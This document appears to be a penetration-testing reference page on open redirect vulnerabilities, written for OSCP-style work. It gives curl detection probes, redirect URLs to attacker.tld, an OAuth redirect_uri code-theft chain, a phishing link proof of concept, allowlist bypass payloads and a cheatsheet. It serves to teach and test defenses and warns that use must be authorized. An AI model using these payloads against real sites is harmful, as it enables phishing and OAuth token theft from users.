# Open Redirect

> Open redirect: an application accepts a user-controlled URL parameter
> and redirects to it without validation. Used for phishing and OAuth
> token theft.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation](#4-exploitation)
- [5. Filter Bypass](#5-filter-bypass)
- [6. Chaining](#6-chaining)
- [7. OSCP Notes](#7-oscp-notes)
- [8. Cheatsheet](#8-cheatsheet)
- [9. References](#9-references)

---

## 1. Overview

Open redirect = the app takes a URL from a parameter and redirects to it.
The redirect target is not validated against an allowlist.

**Impact:**

- Phishing (users trust the domain).
- OAuth token / code theft (redirect_uri manipulation).
- SSRF (if the server fetches the redirect target).
- Bypass of allowlists (open redirect on a trusted domain).

**Common parameters:**

- ?url=, ?next=, ?redirect=, ?return=, ?dest=, ?target=, ?to=, ?goto=
- ?continue=, ?callback=, ?redir=, ?returnUrl=, ?return_to=
- OAuth: redirect_uri, return_uri

**On OSCP:** open redirect rarely appears as a foothold. It is a step in
a chain (OAuth theft, SSRF pivot, phishing PoC).

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Test redirect with your own domain | [PROD] |
| Test redirect to attacker-controlled URL | [PROD] |
| Chain with OAuth to steal token | [PROD-NO] |
| Chain with SSRF | [PROD-NO] |
| Phishing payloads using the redirect | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT use the redirect for actual phishing.
- Do NOT steal OAuth tokens or codes.
- Do NOT chain to SSRF without approval.
- Do NOT spam the redirect endpoint (log noise).

In production, prove open redirect with a benign example.com URL.

---

## 3. Detection

### 3.1 Where to look

- Login pages with ?next=/dashboard.
- Logout with ?redirect=.
- Password reset flows.
- OAuth authorize endpoints (redirect_uri).
- Share links, unsubscribe links.
- Language switcher, currency switcher.

### 3.2 Basic probe

Replace the parameter value with an external domain:

```bash
curl -sI 'http://target/login?next=https://example.com' | grep -i location
curl -sI 'http://target/logout?redirect=https://example.com' | grep -i location
```

**Expected output (vulnerable):**

```text
HTTP/1.1 302 Found
Location: https://example.com
```

If Location points to example.com, the redirect is open.

### 3.3 Client-side redirect

Sometimes the redirect is done in JavaScript:

```bash
curl -s 'http://target/login?next=https://example.com' | grep -iE 'location|window.location|href'
```

Look for reflected example.com inside a script block.

---

## 4. Exploitation

### 4.1 Basic

```text
http://target/login?next=https://attacker.tld/phish
http://target/logout?redirect=//attacker.tld
http://target/go?url=https://attacker.tld
```

### 4.2 OAuth redirect_uri manipulation

In OAuth, 
redirect_uri decides where the authorization code is sent.
If not strictly validated, an attacker can steal the code.

```text
https://target/oauth/authorize?client_id=app&redirect_uri=https://attacker.tld/cb&response_type=code
```

If the provider redirects the code to attacker.tld, the attacker exchanges
it for an access token.

### 4.3 Phishing PoC

```html
<a href="http://trusted.target.com/login?next=https://attacker.tld">Click here to continue</a>
```

Victims trust the visible domain, but the redirect sends them to
attacker.tld.

---

## 5. Filter Bypass

If the app checks that the domain is on an allowlist, try:

### 5.1 Subdomain tricks

```text
http://target.com.attacker.tld
http://attacker.tld#target.com
http://attacker.tld?target.com
http://target.com@attacker.tld
http://target.com.attacker.tld/path
```

### 5.2 Protocol-relative

```text
//attacker.tld
///attacker.tld
////attacker.tld
```

### 5.3 Backslash / encoding

```text
https:%5c%5cattacker.tld    (%5c = backslash)
https:%2fattacker.tld            (%2f = slash)
%68%74%74%70%3a%2f%2fattacker.tld
```

### 5.4 URL parsing confusion

```text
http://allowed.com@attacker.tld            (userinfo)
http://attacker.tld%23.allowed.com     (fragment)
http://allowed.com.attacker.tld            (subdomain)
http://attacker.tld?next=allowed.com       (query)
```

### 5.5 Whitelist bypass with open redirect on allowed domain

If the allowlist includes a domain that has its own open redirect:

```text
http://target/go?url=https://allowed.com/redirect?to=https://attacker.tld
```

---

## 6. Chaining

### 6.1 OAuth code theft

1. Discover open redirect on 
redirect_uri or on a whitelisted domain.
2. Send a crafted authorize URL to the victim.
3. Victim logs in, code is sent to attacker.
4. Attacker exchanges code for token.

### 6.2 SSRF chain

If the app fetches the redirect target server-side, open redirect becomes
SSRF. See [SSRF.md](./SSRF.md).

### 6.3 XSS chain

javascript: in some legacy apps:

```text
http://target/go?url=javascript:alert(document.domain)
```

Modern browsers block this; older apps may not.

### 6.4 Filter bypass on an allowlist

See section 5.5 (open redirect on allowed domain -> external).

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the request with the modified parameter.
> - Screenshot the 302 response with the external Location header.
> - If chained with OAuth or SSRF, show the full chain.
>
> Open redirect alone is a low-severity finding. Only matters in a chain.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 8. Cheatsheet

```bash
# Basic probe
curl -sI 'http://target/?next=https://example.com' | grep -i location

# Common parameters
# url= next= redirect= return= dest= target= goto= continue= callback=
# returnUrl= return_to= redir=
```

```text
Bypass payloads:
//attacker.tld
///attacker.tld
http://target.com@attacker.tld
http://target.com.attacker.tld
http://attacker.tld#target.com
https:%5c%5cattacker.tld
%2f%2fattacker.tld
```

---

## 9. References

- OWASP Unvalidated Redirects - https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- PortSwigger Open Redirect - https://portswigger.net/kb/issues/00500100_open-redirection-reflected
- PayloadsAllTheThings Open Redirect - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- OAuth redirect_uri - https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2

> See also: [SSRF.md](./SSRF.md), [../06 Technologies/OAuth.md](../06%20Technologies/OAuth.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
